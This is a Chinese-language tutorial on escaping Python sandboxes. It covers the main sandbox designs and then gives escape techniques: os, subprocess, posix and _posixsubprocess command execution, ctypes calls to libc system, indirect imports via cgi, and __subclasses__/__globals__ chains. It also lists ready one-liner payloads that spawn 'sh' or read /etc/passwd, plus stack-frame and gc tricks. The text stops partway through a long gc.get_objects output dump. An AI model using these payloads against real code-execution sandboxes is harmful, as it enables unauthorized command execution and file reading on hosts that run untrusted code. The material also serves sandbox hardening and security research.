Python沙箱是一种安全机制，用于在受限环境中执行不受信任的Python代码，防止其执行非预期的指令对主机系统造成危害


# Python代码执行流程
```
code="import os;os.system('whoami')"
workspace = {}  # 创建一个空字典，用于存储执行后的变量
fun = compile(code, 'run_python', 'exec')  # 编译代码
exec(fun, workspace)  # 在 workspace 中执行编译后的代码
```
<img width="1430" height="787" alt="5d31a4f6e6c749e7b2bdce25e161a8ae" src="https://github.com/user-attachments/assets/c05856cc-83a0-45eb-bb7c-f320f578596f" />
Python代码执行流程先由源代码经过语法分析和词法分析解析为抽象语法树，再将AST编译为Python字节码，最后将Python字节码作为Python虚拟机指令执行。

# Python沙箱分类
对于Python沙箱存在多种限制用户执行恶意代码的方法
## 字符串检查
对用户的输入，通过字符串黑名单的方式进行限制，如判断不能出现os.system等字样，防护非常弱存在很多逃逸的可能性。
举例：
某 Python沙箱，分析每一行代码，查看是否开头为import或者from，如果是则从里面切割字符串取出导入的模块，分析是否在白名单中。

绕过方法很多，随便举例：逻辑缺陷，print('a');import os;os.system('touch /tmp/ccc')，确保了非import 开头因此不会被检查。不同场景还有编码绕过等。

## 语法树检查
在代码执行前分析语法树，禁止导入、函数定义等操作，相比纯字符串匹配有一定的加强，可能针对检查的遗漏进行绕过。
举例：
某产品旧版Python沙箱，将用户提交的代码转换成抽象语法树，然后对函数调用进行分析。

## 动态Hook
在Python进程启动时将识别到的危险方法进行替换，为原始函数添加装饰器，实现动态插桩。
## Python虚拟机修改
CPython层面裁剪功能，将非必要的能力删除，增加代码逻辑限制，尽可能缩减攻击面。
去除了os.system、os.popen等危险函数的实现，去除了subprocess、ctype等危险模块的实现，修改取值逻辑不允许获取名称带__的字段等。

# 沙箱逃逸漏洞挖掘思路与技巧
常规的思路：测试一下常见的危险函数能否执行，不进一步思考执行失败的原因。
更好的思路：研究在受限环境中我们可以做的事情，分析清楚沙箱所做的所有限制，思考是否存在方法突破受限环境的限制。
## 基础知识
### Python 命名空间
内置命名空间（built-in namespace）， Python 语言内置的命名空间，比如函数名 abs、char 和异常名称 BaseException、Exception 等等。
全局命名空间（global namespace），模块中定义的命名空间，记录了模块的变量，包括函数、类、其它导入的模块、模块级的变量和常量。
局部命名空间（local namespace），函数中定义的命名空间，记录了函数的变量，包括函数的参数和局部定义的变量。（类中定义的也是）

命名空间查找顺序
假设我们要使用变量 runoob，则 Python 的查找顺序为：局部的命名空间 -> 全局命名空间 -> 内置命名空间。
如果找不到变量 runoob，它将放弃查找并引发一个 NameError 异常:
```
NameError: name 'runoob' is not defined。
```
**全局命名空间**
我们可以通过globals()获取在当前全局命名空间下可以直接访问的变量和函数，如果在这些变量或函数中存在危险能力则可以直接使用。
```
>>> print(globals())
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>}
```
**内置命名空间**
通过print(dir(__builtins__))获取在内置命名空间下可以获取的变量和函数，它是 Python 解释器默认加载的核心功能集合，可以直接在代码中使用，无需导入任何模块。


```
>>> print(dir(__builtins__))
['ArithmeticError','AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'WindowsError', 'ZeroDivisionError', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'breakpoint', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']
```
其中有一些函数可以帮助我们逃逸或辅助我们分析
```
__import__   用于导入模块
__loader__   通过__loader__.load_module 导入模块
__sepc__      通过__spec__.loader.load_module 导入模块
globals 可以列出全局命名空间下的变量
locals 列出局部命名空间下的变量
dir  可以列出对象相关的方法与属性
eval 可以执行任意代码
exec 可以执行任意代码
open 读写文件
```
demo:
可以看到在全局与内置空间都存在__spec__变量，而在全局空间中他的值为null，在builtin中则是一个ModuleSpec，我们要怎么拿到builtin中的__spec__呢。
```
>>> print(__spec__)
None
>>> del __spec__ # 从全局命名空间中删除此变量
>>> print(__spec__) # 再次获取则会从内置命名空间中获取
ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>, origin='built-in')
```
### 模块导入
除了内置和当前全局命名空间下的变量与函数，我们也可以通过导入模块的方式使用其他模块命名空间下的变量与函数。
```
>>> os.system
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'os' is not defined
>>> 
>>> import os
>>> os.system('id')
uid=1001(opsadmin) gid=1001(admingroup) groups=1001(admingroup),10(wheel)
```
### 类的继承
所有的类均继承自Object基类，Python中一切均为对象。
### 魔法方法及魔法字段
Object基类的魔法方法及魔法字段
```
print(dir(object)) # 列出object基类包含的方法及字段
['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
```
其他的类型都会在基类的基础上增加字段和方法。
builtin_function_or_method类
```
print((open.__class__)) # 查看open方法的基类
print((open.__class__.__mro__)) #查看open方法的继承关系
print(dir(open))  #查看builtin_function_or_method类的魔法方法及字段
<class 'builtin_function_or_method'>
(<class 'builtin_function_or_method'>, <class 'object'>)
['__call__', '__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__self__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__text_signature__']
```
type类
```
print(dir(type))
['__abstractmethods__', '__base__', '__bases__', '__basicsize__', '__call__', '__class__', '__delattr__', '__dict__', '__dictoffset__', '__dir__', '__doc__', '__eq__', '__flags__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__instancecheck__', '__itemsize__', '__le__', '__lt__', '__module__', '__mro__', '__name__', '__ne__', '__new__', '__prepare__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasscheck__', '__subclasses__', '__subclasshook__', '__text_signature__', '__weakrefoffset__', 'mro']
```
function类
```
>>> def a():pass #定义函数
... 
>>> print(a.__class__) # 函数类
<class 'function'>
>>> 
>>> print(a.__class__.__mro__) #继承链
(<class 'function'>, <class 'object'>)
>>> 
>>> print(dir(a)) #函数具备的魔法属性与方法
['__annotations__', '__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__', '__getattribute__', '__globals__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__kwdefaults__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
```
其中一些魔法方法和字段的介绍，在分析Python沙箱逃逸时，这些魔法对我们有比较大的帮助
```
__class__  返回类型
__mro__    返回类继承的所有父类
__subclasses__ 函数获取所有子类
__bases__  返回所有直接父类组成的元组
__init__ 类实例创建之后调用, 对当前对象的实例的一些初始化
__globals__ 能够返回函数所在模块命名空间的所有变量
__getattribute__  当类被调用的时候，无条件进入此函数 ，getattr不可用时替换
__getattr__       对象中不存在的属性时调用
__dir__ 列出所有方法和字段
__code__ 函数对象的属性，存储了函数的 编译后的字节码 和其他执行相关的元数据
__dict__  存放类的静态函数、类函数、普通函数、全局变量以及一些内置的属性
```
```
>>> open.__dir__()
['__repr__', '__hash__', '__call__', '__getattribute__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__reduce__', '__module__', '__doc__', '__name__', '__qualname__', '__self__', '__text_signature__', '__str__', '__setattr__', '__delattr__', '__init__', '__new__', '__reduce_ex__', '__subclasshook__', '__init_subclass__', '__format__', '__sizeof__', '__dir__', '__class__']
>>> dir(open)
['__call__', '__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__self__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__text_signature__']
>>> 
>>> import os
>>> getattr(os,"system")
<built-in function system>
>>> os.__getattribute__("system")
<built-in function system>
```
## 危险操作
### 执行系统命令
```
#os模块
import os
os.system('ls')
os.popen('ls -l').read()
os.execv
os.execve
#subprocess模块：
import subprocess
subprocess.Popen('ls -l',shell=True)
subprocess.call('ls',shell=True)
#platform模块：
import platform
platform.popen('ls').read() #py 2.x
#pty模块
import pty
pty.spawn('ls')
pty.os.system('ls')
#commands模块--python2.x
commands.getoutput('ls')
#_posixsubprocess模块，subprocess的底层实现
import os
import _posixsubprocess
_posixsubprocess.fork_exec([b"/bin/cat","/etc/passwd"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False) #3.11,不同版本payload不同
#posix模块,为os模块在linux下的底层实现
posix.system('ls')
posix.popen
#nt模块,为os模块在windows下的底层实现
nt.system('ls')
```
### 文件操作
```
#codecs模块
import codecs
codecs.open('test.txt').read()
#file()函数
file('test.txt').read() #python2.x
#open()函数
open('text.txt').read() #python3.x
```
### Ctypes
ctypes库可以加载共享库，直接调用调用C语言共享库中的函数。\
#### ctypes.CDLL
```
import ctypes
# 加载 C 标准库
libc = ctypes.CDLL(None)  # None 表示使用系统默认的 C 库
# 调用 system 函数执行 whoami 命令
command = b"whoami"  # 注意：需要转换为 bytes 类型
result = libc.system(command)
# 输出 system 函数的返回值
print(f"system 函数返回值: {result}")
```
#### ctypes.PyDLL
直接调用Python C API 函数
```
import ctypes
pydll = ctypes.PyDLL(None)
print(pydll.system(b'whoami'))
```
#### ctypes.pythonapi
ctypes库初始化时会将一个PyDLL对象存放在pythonapi变量中，也可以用这个变量直接调用Python C API 函数。
```
import ctypes
print(ctypes.pythonapi.system(b'whoami'))
```
#### ctypes.LibraryLoader(ctypes.CDLL).LoadLibrary
```
import ctypes
ctypes.LibraryLoader(ctypes.CDLL).LoadLibrary('libc.so.6').system(b'whoami')
```
### 间接引用

#### 利用白名单模块间接引入

比如cgi模块中引入了os模块，我们导入cgi模块就会间接导入os模块，从而可使用os模块。

```python
import cgi
print(cgi.os.system('whoami'))
```

#### 利用魔法方法遍历父子类危险函数和信息 

通过魔法方法可以获得很多其他命名空间下的类

```python
print(object.__subclasses__())
print(().__class__.__base__.__subclasses__()) # __base__获得基础类，__subclasses__()获得所有继承类


[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>, <class 'mappingproxy'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'wrapper_descriptor'>, <class 'method-wrapper'>, <class 'ellipsis'>, <class 'member_descriptor'>, <class 'types.SimpleNamespace'>, <class 'PyCapsule'>, <class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, <class 'classmethod_descriptor'>, <class 'method_descriptor'>, <class 'callable_iterator'>, <class 'iterator'>, <class 'pickle.PickleBuffer'>, <class 'coroutine'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class 'Context'>, <class 'ContextVar'>, <class 'Token'>, <class 'Token.MISSING'>, <class 'moduledef'>, <class 'module'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class 'classmethod'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'dict_itemiterator'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'types.GenericAlias'>, <class 'collections.abc.AsyncIterable'>, <class 'async_generator'>, <class 'collections.abc.Iterable'>, <class 'bytes_iterator'>, <class 'bytearray_iterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'range_iterator'>, <class 'set_iterator'>, <class 'str_iterator'>, <class 'tuple_iterator'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class 'rlcompleter.Completer'>]
```

比如这里面的os._wrap_close 可以通过__globals__获得其模块下的所有方法

```python
>>> print(object.__subclasses__()[133])
<class 'os._wrap_close'>

>>> print(object.__subclasses__()[133].close)
<function _wrap_close.close at 0x7ff1f6768af0>

>>> print(object.__subclasses__()[133].close.__globals__)
{'__name__': 'os', '__doc__': ...... 'execlpe': <function execlpe at 0x7ff1f6767700>, ..... }

>>> print(object.__subclasses__()[133].close.__globals__['system'])
<built-in function system>
```

如果没有os._wrap_close，也可以通过ABC类找到os模块 

可以看到os模块下存在一个class继承自ABC类，那么我们就可以通过ABC类的__subclasses__()找到os.PathLike,再借助底下的function的__globals__找到os模块的所有函数。



```python
>>> print(object.__subclasses__()[112])
<class 'abc.ABC'>
>>> print(object.__subclasses__()[112].__subclasses__())
[<class 'os.PathLike'>]
>>> print(object.__subclasses__()[112].__subclasses__()[0].__fspath__)
<function PathLike.__fspath__ at 0x7f5a22697f70>
>>> print(object.__subclasses__()[112].__subclasses__()[0].__fspath__.__globals__['system'])
<built-in function system>
```

可以通过脚本帮忙查找

```python
def find_os_in_subclass_globals():
    results = []
    for subclass in object.__subclasses__():
        # 遍历子类的所有属性
        for attr_name in dir(subclass):
            if attr_name in ('__abstractmethods__','__annotations__'):
                continue
            attr = getattr(subclass, attr_name)
            # 只检查可调用的对象（函数/方法）
            if callable(attr):
                try:
                    # 获取函数的__globals__属性
                    globals_dict = getattr(attr, '__globals__', {})
                    if globals_dict and 'os' in globals_dict:
                        results.append((subclass, attr_name))
                except Exception:
                    continue
    return results


found = find_os_in_subclass_globals()
if found:
    print("找到包含os模块的函数/方法:")
    for class_name, func_name in found:
        print(f"类: {class_name}, 方法: {func_name}")
else:
    print("未找到包含os模块的函数/方法")
```

```
找到包含os模块的函数/方法:
类: <class '_distutils_hack._TrivialRe'>, 方法: __init__
类: <class '_distutils_hack._TrivialRe'>, 方法: match
类: <class '_distutils_hack.DistutilsMetaFinder'>, 方法: find_spec
类: <class '_distutils_hack.DistutilsMetaFinder'>, 方法: frame_file_is_setup
类: <class '_distutils_hack.DistutilsMetaFinder'>, 方法: is_cpython
类: <class '_distutils_hack.DistutilsMetaFinder'>, 方法: pip_imported_during_build
类: <class '_distutils_hack.DistutilsMetaFinder'>, 方法: spec_for_distutils
类: <class '_distutils_hack.DistutilsMetaFinder'>, 方法: spec_for_pip
类: <class '_distutils_hack.DistutilsMetaFinder'>, 方法: spec_for_sensitive_tests
类: <class '_distutils_hack.DistutilsMetaFinder'>, 方法: spec_for_test.test_distutils
类: <class '_distutils_hack.shim'>, 方法: __enter__
类: <class '_distutils_hack.shim'>, 方法: __exit__
```

列举一些已知的手法

```python
# <class '_frozen_importlib.BuiltinImporter'>
().__class__.__mro__[1].__subclasses__()[104].load_module("os").system("sh");

# <class '_frozen_importlib_external.FileLoader'>
().__class__.__bases__[0].__subclasses__()[118].get_data(".", "/etc/passwd")

# <class '_io._IOBase'> -> <class '_io._RawIOBase'> -> <class '_io.FileIO'>
().__class__.__mro__[1].__subclasses__()[111].__subclasses__()[0].__subclasses__()[0]("/etc/passwd").read()

# <class 'os._wrap_close'>
().__class__.__mro__[1].__subclasses__()[137].__init__.__builtins__["__import__"]("os").system("sh")
().__class__.__mro__[1].__subclasses__()[137].__init__.__globals__["system"]("sh")
().__class__.__mro__[1].__subclasses__()[137].close.__globals__["system"]("sh")

# <class 'subprocess.Popen'>
().__class__.__mro__[1].__subclasses__()[262](["cat","/etc/passwd"], stdout=-1).communicate()[0]

# <class 'abc.ABC'> -> <class 'abc.ABCMeta'>
().__class__.__mro__[1].__subclasses__()[129].__class__.register.__builtins__["__import__"]("os").system("sh")

# <class 'collections.Counter'>
{}.__class__.__subclasses__()[2].copy.__builtins__["__import__"]("os").system("sh")
{}.__class__.__subclasses__()[2].update.__builtins__["__import__"]("os").system("sh")

# <class 'generator'> - instance
(_ for _ in ()).gi_frame.f_globals["__loader__"].load_module("os").system("sh")
(_ for _ in ()).gi_frame.f_globals["__builtins__"].__import__("os").system("sh")

# <class 'async_generator'> - instance
(await _ for _ in ()).ag_frame.f_globals["_""_loader_""_"].load_module("os").system("sh")
(await _ for _ in ()).ag_frame.f_globals["_""_builtins_""_"].eval("_""_import_""_('os').system('sh')")
```

#### 利用栈帧

通过生成器获得调用者的全局命名空间

```python
def waff():
    def f():
        yield g
    g = f()  #生成器
    frame = next(g)
    return frame
test = waff()
print(test.f_back.f_globals)
```

通过抛出异常获得调用者的全局命名空间

```python
try:
    raise Exception
except Exception as e:
    print(e.__traceback__.tb_frame.f_globals)
```

通过sys/inspect获得调用者的全局命名空间

```python
import sys
print(sys._getframe(1).f_back.f_globals)

import inspect
print(inspect.currentframe().f_back.f_globals)
```

 

#### gc

gc模块中提供了多个可以获取相关引用、对象的方法，用这个模块可以很容易找到我们想要的对象。

##### gc.get_objects

返回一个列表，可以获得所有的对象，这里以前30个对象作为示例。

```python
import gc
print(gc.get_objects()[:30])

"[('.pyc', <class '_frozen_importlib_external.SourcelessFileLoader'>), {'_loaders': [('.cpython-39-x86_64-linux-gnu.so', <class '_frozen_importlib_external.ExtensionFileLoader'>), ('.abi3.so', <class '_frozen_importlib_external.ExtensionFileLoader'>), ('.so', <class '_frozen_importlib_external.ExtensionFileLoader'>), ('.py', <class '_frozen_importlib_external.SourceFileLoader'>), ('.pyc', <class '_frozen_importlib_external.SourcelessFileLoader'>)], 'path': '/usr/local/lib/python3.9/site-packages/sympy/plotting/backends/textbackend', '_path_mtime': 1739878318.0, '_path_cache': {'text.py', '__init__.py', '__pycache__'}, '_relaxed_path_cache': set()}, set(), {'text.py', '__init__.py', '__pycache__'}, <_frozen_importlib_external.SourceFileLoader object at 0x7f6a9dc615e0>, ModuleSpec(name='sympy.plotting.backends.textbackend.text', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7f6a9dc615e0>, origin='/usr/local/lib/python3.9/site-packages/sympy/plotting/backends/textbackend/text.py'), {'name': 'sympy.plotting.backends.textbackend.text', 'loader': <_frozen_importlib_external.SourceFileLoader object at 0x7f6a9dc615e0>, 'origin': '/usr/local/lib/python3.9/site-packages/sympy/plotting/backends/textbackend/text.py', 'loader_state': None, 'submodule_search_locations': None, '_set_fileattr': True, '_cached': '/usr/local/lib/python3.9/site-packages/sympy/plotting/backends/textbackend/__pycache__/text.cpython-39.pyc', '_initializing': False}, <module 'sympy.plotting.backends.textbackend.text' from '/usr/local/lib/python3.9/site-packages/sympy/plotting/backends/textbackend/text.py'>, {'__name__': 'sympy.plotting.backends.textbackend.text', '__doc__': None, '__package__': 'sympy.plotting.backends.textbackend', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f6a9dc615e0>, '__spec__': ModuleSpec(name='sympy.plotting.backends.textbackend.text', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7f6a9dc615e0>, origin='/usr/local/lib/python3.9/site-packages/sympy/plotting/backends/textbackend/text.py'), '__file__': '/usr/local/lib/python3.9/site-packages/sympy/plotting/backends/textbackend/text.py', '__cached__': '/usr/local/lib/python3.9/site-packages/sympy/plotting/backends/textbackend/__pycache__/text.cpython-39.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': \"Built-in functions, exceptions, and other objects.\\n\\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.\", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <function ascii at 0x7f6ab85e2ee0>, 'bin': <function bin at 0x7f6ab85e2f70>, 'breakpoint': <function breakpoint at 0x7f6ab85e8040>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <function delattr at 0x7f6ab85e80d0>, 'dir': <function dir at 0x7f6ab85e8160>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <function format at 0x7f6ab85e81f0>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <function hex at 0x7f6ab85e8280>, 'id': <built-in function id>, 'input': <function input at 0x7f6ab85e83a0>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <function oct at 0x7f6ab85e8430>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <function hook_setattr.<locals>.builtin_setattr_with_checkcode at 0x7f6ab8a58e50>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': <class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'open': <function open at 0x7f6ab85e8550>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2021 Python Software Foundation.\nAll Rights Reserved.\n\nCopyright (c) 2000 BeOpen.com.\nAll Rights Reserved.\n\nCopyright (c) 1995-2001 Corporation for National Research Initiatives.\nAll Rights Reserved.\n\nCopyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam.\nAll Rights Reserved., 'credits':     Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands\n    for supporting Python development.  See www.python.org for more information., 'license': See 